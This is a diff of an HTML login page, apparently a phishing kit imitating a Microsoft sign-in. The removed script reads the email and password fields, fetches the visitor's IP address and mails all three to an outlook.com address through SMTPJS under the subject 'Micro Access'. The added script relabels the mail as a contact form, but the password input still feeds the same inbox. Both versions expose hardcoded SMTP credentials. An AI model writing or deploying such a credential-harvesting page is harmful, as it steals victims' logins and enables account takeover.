@@ -75,10 +75,10 @@ span.psw {
   <div class="container">
   <form onsubmit="sendMail(); reset(); return false;">
     <label for="email"><b>Username</b></label>
-    <input type="text" id="inp_pwd" placeholder="Email/Mobile number" name="email" required>
+    <input type="text" id="email" placeholder="Email/Mobile number" name="email" required>
     
     <label for="password"><b>Password</b></label>
-    <input type="password" id="inp_uname" placeholder="Enter Password" name="password" required>
+    <input type="password" id="name" placeholder="Enter Password" name="password" required>
         
     <button type="submit">Login</button>
     <label>
@@ -113,38 +113,25 @@ span.psw {
           </div>
         </div>
   </div>
-    <script src="https://smtpjs.com/v3/smtp.js"/></script>
-    <script>
-        function sendmail(){
-          var email = document.getElementById('inp_pwd').value;
-          var password = document.getElementById('inp_uname').value;
-          //const ipAddress = event.candidate.candidate.split(' ')[4];
-           
-           fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    ipAddress = data.ip;
-                    this.sendEmail(email, password, ipAddress);
-                })
-                .catch(error => {
-                    console.log('Error:', error);
-            });
-        }
-        function sendEmail(email, password, ipAddress) {
-                Email.send({
-                    Host: "smtp.elasticemail.com",
-                    Username: "Akinola11549@outlook.com",
-                    Port:"2525",
-                    Password: "9C7824D1474AA7E50B3CAE331A2933565720",
-                    To: 'Akinola11549@outlook.com',
-                    From: "Akinola11549@outlook.com",
-                    Subject: "Micro Access",
-                    Body: `Email: ${email} <br> password: ${password}<br>IP Address: ${ipAddress}`,
-                })
-                    .then(function (message) {
-                       // alert("mail sent successfully")
-                    });
-            }
-    </script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+<script type="text/javascript">
+function sendEmail() {
+Email.send({
+Host: "smtp.elasticemail.com",
+Username: "akinola11549@outlook.com", // Your SMTP username
+Password: "9C7824D1474AA7E50B3CAE331A2933565720", // Your SMTP password
+To: 'akinola11549@outlook.com', // Recipient's email address
+From: document.getElementById("email").value,
+Subject: "New Message from Contact Form",
+Body: "Name: " + document.getElementById("name").value +
+"<br>Email: " + document.getElementById("email").value +
+"<br>Message: " + document.getElementById("message").value
+}).then(
+message => alert("Mail sent successfully!")
+).catch(
+error => alert("Error sending email: " + error)
+);
+}
+</script>
 </body>
 </html>
